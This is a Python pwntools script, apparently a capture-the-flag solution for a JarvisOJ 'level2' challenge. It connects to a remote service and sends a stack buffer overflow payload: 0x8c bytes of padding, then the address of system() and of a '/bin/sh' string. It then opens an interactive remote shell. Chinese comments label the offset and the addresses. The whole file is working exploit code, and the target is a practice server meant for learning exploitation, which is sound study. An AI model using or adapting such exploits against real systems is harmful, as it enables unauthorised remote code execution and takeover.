#!/usr/bin/env python
# coding=utf-8
from pwn import *
nc='pwn2.jarvisoj.com'
point=9878
################# 


p = remote(nc,point)
#p = process('./level2.54931449c557d0551c4fc2a10f4778a1')
junk = "A"*0x8c
addr1= 0x0804a024
#shellcode=asm(shellcraft.sh())
#this=p.recvline()[12:-2]
#addr2=int(0xffed3bb0)
#payload=shellcode+'A'*(0x8c-len(shellcode))+p32(addr2)
payload = ''
payload+=junk	#溢出长度
payload+=p32(0x08048320)+p32(0x08048320)+p32(addr1)
#			system地址	system返回地址  /bin/sh地址
p.send(payload)

#################







p.interactive()
